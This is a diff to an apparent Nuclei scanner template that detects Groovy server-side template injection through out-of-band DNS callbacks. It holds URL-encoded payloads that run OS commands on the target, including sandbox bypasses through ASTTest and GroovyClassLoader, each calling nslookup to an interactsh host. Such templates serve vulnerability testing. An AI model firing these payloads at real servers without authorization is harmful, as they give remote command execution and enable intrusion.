@@ -1,5 +1,4 @@
 id: groovy-oob
-
 info:
   name: Groovy - Out of Band Template Injection
   author: 0xAwali,DhiyaneshDK,ritikchaddha
@@ -12,35 +11,36 @@ info:
     - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#groovy---command-execution
   metadata:
     verified: true
-  tags: ssti,dast,oast,oob,groovy,vuln
-
+  tags: dast,groovy,oast,oob,ssti,vuln
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - fuzzing:
+      - fuzz:
+          - '{{injection}}'
+        mode: single
+        parts:
+          - query
+          - body
+        type: postfix
+    matchers:
+      - condition: and
+        # digest: 490a0046304402203c45fd69918df3c793c28a28974da920c7bb18401a626066ffb85f7cc90094c1022010ed8148ebd72028668366addcb1f2e7852c9304710459b6d94895941a0e565d:922c64590222798bb761d5b6d8e72950
 
+        dsl:
+          - contains(interactsh_protocol,'dns')
+          - contains(interactsh_request,'srv')
+        name: request-matcher
+        type: dsl
     payloads:
       injection:
         - '%24%7Brce%3D%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%3Brce.execute%28%29.text%7D'
-        - "%24%7B%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22.exec()%7D"
-        - "%24%7Bnew%20org.codehaus.groovy.runtime.MethodClosure(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%2C%22execute%22).call()%7D"
+        - '%24%7B%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22.exec()%7D'
+        - '%24%7Bnew%20org.codehaus.groovy.runtime.MethodClosure(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%2C%22execute%22).call()%7D'
         # Sandbox bypass
-        - "%24%7B%20%40ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)%7D)%20def%20x%20%7D"
-        - "%24%7B%20new%20groovy.lang.GroovyClassLoader().parseClass(%22%40groovy.transform.ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%5C%22nslookup%20-type%3DSRV%20{{interactsh-url}}%5C%22)%7D)def%20x%22)%20%7D"
-
-    fuzzing:
-      - part: query
-        type: postfix
-        mode: single
-        fuzz:
-          - "{{injection}}"
-
-    matchers:
-      - type: dsl
-        name: request-matcher
-        dsl:
-          - "contains(interactsh_protocol,'dns')"
-          - "contains(interactsh_request,'srv')"
-        condition: and
-# digest: 4a0a00473045022010b5e98da5cf7fe997be5d2ff2c4ad39b4037db9e3bcb6f50ee46cf83a2b66ea022100f8ecec2f82d7be36f4d593c9fef154ba66463d6024353dc1e2ec6f4b25741e92:922c64590222798bb761d5b6d8e72950
+        - '%24%7B%20%40ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)%7D)%20def%20x%20%7D'
+        - '%24%7B%20new%20groovy.lang.GroovyClassLoader().parseClass(%22%40groovy.transform.ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%5C%22nslookup%20-type%3DSRV%20{{interactsh-url}}%5C%22)%7D)def%20x%22)%20%7D'
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
